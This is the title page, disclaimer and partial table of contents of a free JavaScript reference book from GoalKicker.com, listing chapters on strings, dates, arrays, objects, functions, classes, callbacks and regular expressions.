JavaScript
Notes for ProfessionalsJavaScript®
Notes for Professionals
GoalKicker.com
Free Programming BooksDisclaimer
This is an unocial free book created for educational purposes and is
not aliated with ocial JavaScript ® group(s) or company(s).
All trademarks and registered trademarks are
the property of their respective owners
400+ pages
of professional hints and tricks
Contents
About  1  ................................................................................................................................................................................... 
Section 7.14: String Find and Replace Functions  44  ...................................................................................................... 
Section 7.15: Find the index of a substring inside a string  45  ....................................................................................... 
Section 7.16: String to Upper Case  45  ............................................................................................................................. 
Section 7.17: String to Lower Case  46  ............................................................................................................................. 
Section 7.18: Repeat a String  46  ...................................................................................................................................... 
Chapter 8: Date  47  ........................................................................................................................................................... 
Section 8.1: Create a new Date object  47  ....................................................................................................................... 
Section 8.2: Convert to a string format  49  .................................................................................................................... 
Section 8.3: Creating a Date from UTC  50  ..................................................................................................................... 
Section 8.4: Formatting a JavaScript date  53  ............................................................................................................... 
Section 8.5: Get the number of milliseconds elapsed since 1 January 1970 00:00:00 UTC  55  ................................. 
Section 8.6: Get the current time and date  55  ............................................................................................................... 
Section 8.7: Increment a Date Object  56  ....................................................................................................................... 
Section 8.8: Convert to JSON  57  ..................................................................................................................................... 
Chapter 9: Date Comparison  58  ................................................................................................................................ 
Section 9.1: Comparing Date values  58  .......................................................................................................................... 
Section 9.2: Date Dierence Calculation  59  .................................................................................................................. 
Chapter 10: Comparison Operations  60  ................................................................................................................ 
Section 10.1: Abstract equality / inequality and type conversion  60  ........................................................................... 
Section 10.2: NaN Property of the Global Object  61  ..................................................................................................... 
Section 10.3: Short-circuiting in boolean operators  63  ................................................................................................. 
Section 10.4: Null and Undeﬁned  65  ............................................................................................................................... 
Section 10.5: Abstract Equality (==)  65  ........................................................................................................................... 
Section 10.6: Logic Operators with Booleans  66  ........................................................................................................... 
Section 10.7: Automatic Type Conversions  67  ............................................................................................................... 
Section 10.8: Logic Operators with Non-boolean values (boolean coercion)  67  ....................................................... 
Section 10.9: Empty Array  68  ........................................................................................................................................... 
Section 10.10: Equality comparison operations  68  ........................................................................................................ 
Section 10.11: Relational operators (<, <=, >, >=)  70  ........................................................................................................ 
Section 10.12: Inequality  71  .............................................................................................................................................. 
Section 10.13: List of Comparison Operators  72  ............................................................................................................ 
Section 10.14: Grouping multiple logic statements  72  ................................................................................................... 
Section 10.15: Bit ﬁelds to optimise comparison of multi state data  72  ...................................................................... 
Chapter 11: Conditions  74  .............................................................................................................................................. 
Section 11.1: Ternary operators  74  .................................................................................................................................. 
Section 11.2: Switch statement  75  .................................................................................................................................... 
Section 11.3: If / Else If / Else Control  77  ......................................................................................................................... 
Section 11.4: Strategy  78  ................................................................................................................................................... 
Section 11.5: Using || and && short circuiting  79  ............................................................................................................. 
Chapter 12: Arrays  80  ...................................................................................................................................................... 
Section 12.1: Converting Array-like Objects to Arrays  80  ............................................................................................. 
Section 12.2: Reducing values  82  .................................................................................................................................... 
Section 12.3: Mapping values  84  ..................................................................................................................................... 
Section 12.4: Filtering Object Arrays  84  .......................................................................................................................... 
Section 12.5: Sorting Arrays  86  ........................................................................................................................................ 
Section 12.6: Iteration  88  .................................................................................................................................................. 
Section 12.7: Destructuring an array  92  ......................................................................................................................... 
Section 12.8: Removing duplicate elements  93  ............................................................................................................. 
Section 12.9: Array comparison  93  ................................................................................................................................. 
Section 12.10: Reversing arrays  94  .................................................................................................................................. 
Section 12.11: Shallow cloning an array  95  ..................................................................................................................... 
Section 12.12: Concatenating Arrays  95  ......................................................................................................................... 
Section 12.13: Merge two array as key value pair  97  .................................................................................................... 
Section 12.14: Array spread / rest  97  .............................................................................................................................. 
Section 12.15: Filtering values  98  ..................................................................................................................................... 
Section 12.16: Searching an Array  99  .............................................................................................................................. 
Section 12.17: Convert a String to an Array  100  ............................................................................................................ 
Section 12.18: Removing items from an array  100  ........................................................................................................ 
Section 12.19: Removing all elements  101  ...................................................................................................................... 
Section 12.20: Finding the minimum or maximum element  102  .................................................................................. 
Section 12.21: Standard array initialization  103  ............................................................................................................. 
Section 12.22: Joining array elements in a string  104  .................................................................................................. 
Section 12.23: Removing/Adding elements using splice()  105  .................................................................................... 
Section 12.24: The entries() method  105  ........................................................................................................................ 
Section 12.25: Remove value from array  105  ................................................................................................................ 
Section 12.26: Flattening Arrays  106  .............................................................................................................................. 
Section 12.27: Append / Prepend items to Array  107  ................................................................................................... 
Section 12.28: Object keys and values to array  107  ..................................................................................................... 
Section 12.29: Logical connective of values  108  ........................................................................................................... 
Section 12.30: Checking if an object is an Array  108  .................................................................................................... 
Section 12.31: Insert an item into an array at a speciﬁc index  109  .............................................................................. 
Section 12.32: Sorting multidimensional array  109  ....................................................................................................... 
Section 12.33: Test all array items for equality  110  ...................................................................................................... 
Section 12.34: Copy part of an Array  110  ...................................................................................................................... 
Chapter 13: Objects  112  .................................................................................................................................................. 
Section 13.1: Shallow cloning  112  ..................................................................................................................................... 
Section 13.2: Object.freeze  112  ........................................................................................................................................ 
Section 13.3: Object cloning  113  ...................................................................................................................................... 
Section 13.4: Object properties iteration  114  ................................................................................................................. 
Section 13.5: Object.assign  115  ........................................................................................................................................ 
Section 13.6: Object rest/spread (...)  116  ........................................................................................................................ 
Section 13.7: Object.deﬁneProperty  116  ......................................................................................................................... 
Section 13.8: Accesor properties (get and set)  117  ....................................................................................................... 
Section 13.9: Dynamic / variable property names  117  ................................................................................................ 
Section 13.10: Arrays are Objects  118  ............................................................................................................................. 
Section 13.11: Object.seal  119  ........................................................................................................................................... 
Section 13.12: Convert object's values to array  120  ...................................................................................................... 
Section 13.13: Retrieving properties from an object  120  ............................................................................................... 
Section 13.14: Read-Only property  123  ........................................................................................................................... 
Section 13.15: Non enumerable property  123  ................................................................................................................ 
Section 13.16: Lock property description  123  ................................................................................................................. 
Section 13.17: Object.getOwnPropertyDescriptor  124  ................................................................................................... 
Section 13.18: Descriptors and Named Properties  124  ................................................................................................. 
Section 13.19: Object.keys  126  ......................................................................................................................................... 
Section 13.20: Properties with special characters or reserved words  126  .................................................................. 
Section 13.21: Creating an Iterable object  127  ............................................................................................................... 
Section 13.22: Iterating over Object entries - Object.entries()  127  .............................................................................. 
Section 13.23: Object.values()  128  ................................................................................................................................... 
Chapter 14: Arithmetic (Math)  129  ........................................................................................................................... 
Section 14.1: Constants  129  .............................................................................................................................................. 
Section 14.2: Remainder / Modulus (%)  129  .................................................................................................................. 
Section 14.3: Rounding  130  .............................................................................................................................................. 
Section 14.4: Trigonometry  132  ....................................................................................................................................... 
Section 14.5: Bitwise operators  133  ................................................................................................................................ 
Section 14.6: Incrementing (++)  135  ................................................................................................................................ 
Section 14.7: Exponentiation (Math.pow() or **)  135  ..................................................................................................... 
Section 14.8: Random Integers and Floats  136  ............................................................................................................. 
Section 14.9: Addition (+)  137  .......................................................................................................................................... 
Section 14.10: Little / Big endian for typed arrays when using bitwise operators  137  .............................................. 
Section 14.11: Get Random Between Two Numbers  138  ............................................................................................... 
Section 14.12: Simulating events with dierent probabilities  139  ................................................................................. 
Section 14.13: Subtraction (-)  140  .................................................................................................................................... 
Section 14.14: Multiplication (*)  140  ................................................................................................................................. 
Section 14.15: Getting maximum and minimum  140  ..................................................................................................... 
Section 14.16: Restrict Number to Min/Max Range  141  ................................................................................................ 
Section 14.17: Ceiling and Floor  141  ................................................................................................................................ 
Section 14.18: Getting roots of a number  142  ................................................................................................................ 
Section 14.19: Random with gaussian distribution  142  ................................................................................................. 
Section 14.20: Math.atan2 to ﬁnd direction  143  ............................................................................................................ 
Section 14.21: Sin & Cos to create a vector given direction & distance  143  ............................................................... 
Section 14.22: Math.hypot  144  ......................................................................................................................................... 
Section 14.23: Periodic functions using Math.sin  145  .................................................................................................... 
Section 14.24: Division (/)  146  ......................................................................................................................................... 
Section 14.25: Decrementing (--)  146  ............................................................................................................................. 
Chapter 15: Bitwise operators  148  ............................................................................................................................ 
Section 15.1: Bitwise operators  148  ................................................................................................................................. 
Section 15.2: Shift Operators  150  .................................................................................................................................... 
Chapter 16: Constructor functions  151  ................................................................................................................... 
Section 16.1: Declaring a constructor function  151  ........................................................................................................ 
Chapter 17: Declarations and Assignments  152  ................................................................................................ 
Section 17.1: Modifying constants  152  ............................................................................................................................ 
Section 17.2: Declaring and initializing constants  152  .................................................................................................. 
Section 17.3: Declaration  152  ........................................................................................................................................... 
Section 17.4: Undeﬁned  153  ............................................................................................................................................. 
Section 17.5: Data Types  153  ........................................................................................................................................... 
Section 17.6: Mathematic operations and assignment  153  .......................................................................................... 
Section 17.7: Assignment  155  ........................................................................................................................................... 
Chapter 18: Loops  156  ..................................................................................................................................................... 
Section 18.1: Standard "for" loops  156  ............................................................................................................................ 
Section 18.2: "for ... of" loop  157  ...................................................................................................................................... 
Section 18.3: "for ... in" loop  159  ....................................................................................................................................... 
Section 18.4: "while" Loops  159  ....................................................................................................................................... 
Section 18.5: "continue" a loop  160  ................................................................................................................................. 
Section 18.6: Break speciﬁc nested loops  161  ............................................................................................................... 
Section 18.7: "do ... while" loop  161  .................................................................................................................................. 
Section 18.8: Break and continue labels  161  ................................................................................................................. 
Chapter 19: Functions  163  ............................................................................................................................................. 
Section 19.1: Function Scoping  163  .................................................................................................................................. 
Section 19.2: Currying  164  ................................................................................................................................................ 
Section 19.3: Immediately Invoked Function Expressions  165  ..................................................................................... 
Section 19.4: Named Functions  166  ................................................................................................................................ 
Section 19.5: Binding `this` and arguments  169  ............................................................................................................. 
Section 19.6: Functions with an Unknown Number of Arguments (variadic functions)  171  ..................................... 
Section 19.7: Anonymous Function  172  .......................................................................................................................... 
Section 19.8: Default parameters  174  ............................................................................................................................ 
Section 19.9: Call and apply  176  ...................................................................................................................................... 
Section 19.10: Partial Application  177  .............................................................................................................................. 
Section 19.11: Passing arguments by reference or value  178  ....................................................................................... 
Section 19.12: Function Arguments, "arguments" object, rest and spread parameters  179  .................................... 
Section 19.13: Function Composition  179  ........................................................................................................................ 
Section 19.14: Get the name of a function object  180  ................................................................................................... 
Section 19.15: Recursive Function  180  ............................................................................................................................. 
Section 19.16: Using the Return Statement  181  ............................................................................................................. 
Section 19.17: Functions as a variable  182  ..................................................................................................................... 
Chapter 20: Functional JavaScript  185  .................................................................................................................. 
Section 20.1: Higher-Order Functions  185  ...................................................................................................................... 
Section 20.2: Identity Monad  185  ................................................................................................................................... 
Section 20.3: Pure Functions  187  .................................................................................................................................... 
Section 20.4: Accepting Functions as Arguments  188  ................................................................................................. 
Chapter 21: Prototypes, objects  190  ........................................................................................................................ 
Section 21.1: Creation and initialising Prototype  190  ..................................................................................................... 
Chapter 22: Classes  192  ................................................................................................................................................. 
Section 22.1: Class Constructor  192  ................................................................................................................................ 
Section 22.2: Class Inheritance  192  ................................................................................................................................ 
Section 22.3: Static Methods  193  .................................................................................................................................... 
Section 22.4: Getters and Setters  193  ............................................................................................................................ 
Section 22.5: Private Members  194  ................................................................................................................................ 
Section 22.6: Methods  195  ............................................................................................................................................... 
Section 22.7: Dynamic Method Names  195  ................................................................................................................... 
Section 22.8: Managing Private Data with Classes  196  ............................................................................................... 
Section 22.9: Class Name binding  198  ........................................................................................................................... 
Chapter 23: Namespacing  199  .................................................................................................................................... 
Section 23.1: Namespace by direct assignment  199  .................................................................................................... 
Section 23.2: Nested Namespaces  199  .......................................................................................................................... 
Chapter 24: Context (this)  200  .................................................................................................................................... 
Section 24.1: this with simple objects  200  ....................................................................................................................... 
Section 24.2: Saving this for use in nested functions / objects  200  ............................................................................ 
Section 24.3: Binding function context  201  .................................................................................................................... 
Section 24.4: this in constructor functions  202  .............................................................................................................. 
Chapter 25: Setters and Getters  203  ...................................................................................................................... 
Section 25.1: Deﬁning a Setter/Getter Using Object.deﬁneProperty  203  ................................................................... 
Section 25.2: Deﬁning an Setter/Getter in a Newly Created Object  203  ................................................................... 
Section 25.3: Deﬁning getters and setters in ES6 class  203  ......................................................................................... 
Chapter 26: Events  205  ................................................................................................................................................... 
Section 26.1: Page, DOM and Browser loading  205  ...................................................................................................... 
Chapter 27: Inheritance  206  ......................................................................................................................................... 
Section 27.1: Standard function prototype  206  ............................................................................................................. 
Section 27.2: Dierence between Object.key and Object.prototype.key  206  ............................................................ 
Section 27.3: Prototypal inheritance  206  ....................................................................................................................... 
Section 27.4: Pseudo-classical inheritance  207  ............................................................................................................. 
Section 27.5: Setting an Object's prototype  208  ........................................................................................................... 
Chapter 28: Method Chaining  210  ............................................................................................................................. 
Section 28.1: Chainable object design and chaining  210  .............................................................................................. 
Section 28.2: Method Chaining  212  ................................................................................................................................ 
Chapter 29: Callbacks  213  ............................................................................................................................................. 
Section 29.1: Simple Callback Usage Examples  213  ..................................................................................................... 
Section 29.2: Continuation (synchronous and asynchronous)  214  ............................................................................ 
Section 29.3: What is a callback?  215  ............................................................................................................................ 
Section 29.4: Callbacks and `this`  216  ............................................................................................................................ 
Section 29.5: Callback using Arrow function  217  .......................................................................................................... 
Section 29.6: Error handling and control-ﬂow branching  218  ..................................................................................... 
Chapter 30: Intervals and Timeouts  219  ............................................................................................................... 
Section 30.1: Recursive setTimeout  219  ......................................................................................................................... 
Section 30.2: Intervals  219  ............................................................................................................................................... 
Section 30.3: Intervals  219  ............................................................................................................................................... 
Section 30.4: Removing intervals  220  ............................................................................................................................ 
Section 30.5: Removing timeouts  220  ............................................................................................................................ 
Section 30.6: setTimeout, order of operations, clearTimeout  220  .............................................................................. 
Chapter 31: Regular expressions  222  ....................................................................................................................... 
Section 31.1: Creating a RegExp Object  222  ................................................................................................................... 
Section 31.2: RegExp Flags  222  ....................................................................................................................................... 
Section 31.3: Check if string contains pattern using .test()  223  .................................................................................... 
Section 31.4: Matching With .exec()  223  ......................................................................................................................... 
